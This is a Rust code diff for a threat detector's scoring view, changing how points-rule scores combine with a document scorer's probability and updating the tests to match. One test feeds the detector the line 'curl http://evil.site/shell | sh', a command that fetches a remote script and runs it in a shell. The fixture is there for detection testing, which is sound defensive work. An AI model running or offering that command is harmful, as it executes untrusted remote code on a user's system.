@@ -50,10 +50,13 @@ impl Default for ThreatThresholds {
 }
 
 /// What a configured cascade reads from a Threat detection's `details`
-/// without the detection writing anything for it: the document scorer's own
-/// probability (also below its cut), recomputed from `matched_rules`, and
-/// whether a points rule accepted on its own kept its evidence after the mode
-/// floor (`has_evidence_at` its span). `None` for details of other producers.
+/// without the detection writing anything for it: the heuristic's graded
+/// score and whether a points rule accepted on its own kept its evidence
+/// after the mode floor (`has_evidence_at` its span). The score is the
+/// highest of the document scorer's own probability (also below its cut),
+/// recomputed from `matched_rules`, and the `rule_score` of every accepted
+/// points rule that kept its evidence, so a points hit carries its points
+/// score, never 0. `None` for details of other producers.
 pub(crate) fn cascade_view(
     details: &HashMap<String, serde_json::Value>,
     has_evidence_at: impl Fn(usize, usize) -> bool,
@@ -64,14 +67,26 @@ pub(crate) fn cascade_view(
         .as_str()?
         .starts_with("ark-threat-l1")
         .then(|| {
-            let points_accepted = rules.iter().any(|rule| {
-                let byte = |key: &str| rule.get(key)?.as_u64().map(|value| value as usize);
-                rule.get("accepted") == Some(&serde_json::Value::Bool(true))
-                    && byte("start_byte")
-                        .zip(byte("end_byte"))
-                        .is_some_and(|(start, end)| has_evidence_at(start, end))
-            });
-            (scorer::score(rules).0, points_accepted)
+            let points = rules
+                .iter()
+                .filter(|rule| {
+                    let byte = |key: &str| rule.get(key)?.as_u64().map(|value| value as usize);
+                    rule.get("accepted") == Some(&serde_json::Value::Bool(true))
+                        && byte("start_byte")
+                            .zip(byte("end_byte"))
+                            .is_some_and(|(start, end)| has_evidence_at(start, end))
+                })
+                .map(|rule| {
+                    rule.get("rule_score")
+                        .and_then(serde_json::Value::as_f64)
+                        .unwrap_or(0.0)
+                })
+                .reduce(f64::max);
+            let scorer = scorer::score(rules).0;
+            (
+                points.map_or(scorer, |points| scorer.max(points)),
+                points.is_some(),
+            )
         })
 }
 
@@ -1569,11 +1584,19 @@ mod tests {
                     .any(|span| span.start_byte == start && span.end_byte == end)
             }
         };
-        let (scorer, points_accepted) = cascade_view(&points.details, at(&points)).unwrap();
-        assert!(points_accepted && scorer < scorer::config().acceptance_threshold);
-        // Its evidence dropped by a mode floor: no longer a hit on its own.
-        let (_, floored) = cascade_view(&points.details, |_, _| false).unwrap();
+        let (score, points_accepted) = cascade_view(&points.details, at(&points)).unwrap();
+        // The hit carries its points score (the reported score), never 0.
+        assert!(points_accepted && score > 0.0);
+        assert_eq!(json!(score), points.details["score"]);
+        // Its evidence dropped by a mode floor: no longer a hit on its own,
+        // and only the document scorer's probability is left.
+        let (floored_score, floored) = cascade_view(&points.details, |_, _| false).unwrap();
         assert!(!floored);
+        assert_eq!(
+            floored_score,
+            scorer::score(points.details["matched_rules"].as_array().unwrap()).0
+        );
+        assert!(floored_score < score);
         // A scorer rule: no points hit, the view's score is the reported score.
         let scored = detect_with("curl http://evil.site/shell | sh");
         let (scorer, points_accepted) = cascade_view(&scored.details, at(&scored)).unwrap();
